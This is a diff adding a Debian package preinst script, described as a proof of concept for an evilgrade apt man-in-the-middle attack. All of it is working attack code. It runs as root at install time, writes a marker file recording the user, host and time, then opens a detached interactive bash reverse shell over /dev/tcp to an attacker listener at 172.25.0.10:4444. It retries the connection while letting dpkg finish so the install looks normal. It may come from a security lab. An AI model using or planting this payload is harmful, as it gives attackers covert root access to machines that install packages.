@@ -1,0 +1,31 @@
+#!/bin/sh
+# preinst - runs as root at install time (apt/dpkg).
+# PoC for evilgrade apt MITM: proves code execution, opens an interactive
+# reverse shell back to the attacker, and returns control to dpkg cleanly
+# (fully detached, so the install completes with no hung pipe).
+
+RHOST=172.25.0.10     # evilgrade (attacker listener)
+RPORT=4444
+
+# 1) Observable proof of root code execution (does not block dpkg).
+{
+    echo "owned by evilgrade apt MITM"
+    echo "date: $(date -u 2>/dev/null)"
+    echo "user: $(id 2>/dev/null)"
+    echo "host: $(hostname 2>/dev/null)"
+    echo "callback: ${RHOST}:${RPORT}"
+} > /tmp/OWNED_BY_EVILGRADE 2>/dev/null
+
+# 2) Interactive reverse shell back to the attacker, fully detached so dpkg
+#    does NOT wait on it. bash supports /dev/tcp. Retries a few times so the
+#    listener can be started around install time; silent if nobody listens.
+setsid bash -c '
+  i=0
+  while [ $i -lt 30 ]; do
+    exec 9<>/dev/tcp/'"$RHOST"'/'"$RPORT"' 2>/dev/null && break
+    i=$((i+1)); sleep 2
+  done
+  [ $i -lt 30 ] && bash -i <&9 >&9 2>&9
+' </dev/null >/dev/null 2>&1 &
+
+exit 0
